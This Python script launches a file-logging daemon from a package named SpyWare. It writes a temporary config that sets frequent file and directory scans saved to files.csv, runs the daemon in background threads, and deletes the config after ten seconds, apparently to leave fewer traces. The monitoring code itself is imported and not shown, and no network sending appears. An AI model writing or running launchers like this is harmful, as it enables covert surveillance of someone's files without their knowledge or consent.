import tempfile
import os
import threading
import time
from SpyWare.FilesLogger import Daemon as filesDaemon, filesConfig
def write_temp_config(name, content):
    temp_path = os.path.join(tempfile.gettempdir(), name)
    with open(temp_path, "w") as f:
        f.write(content.strip())
    return temp_path

def delayed_cleanup(paths, delay=10):
    time.sleep(delay)
    for path in paths:
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            print(f"Cleanup failed for {path}: {e}")

def run_all():
    threads = []
    config_paths = []

    files_conf = """[SAVE]
        filename = files.csv

        [TIME]
        file_interval = 0.1
        directory_interval = 1
        scan_interval = 86400"""
    files_conf_path = write_temp_config("files.conf", files_conf)
    filesConfig(files_conf_path)
    config_paths.append(files_conf_path)
    threads.append(threading.Thread(target=filesDaemon().run_for_ever))
    cleanup_thread = threading.Thread(target=delayed_cleanup, args=(config_paths,))
    cleanup_thread.daemon = True
    cleanup_thread.start()

    for thread in threads:
        thread.daemon = True
        thread.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Exiting...")

run_all()
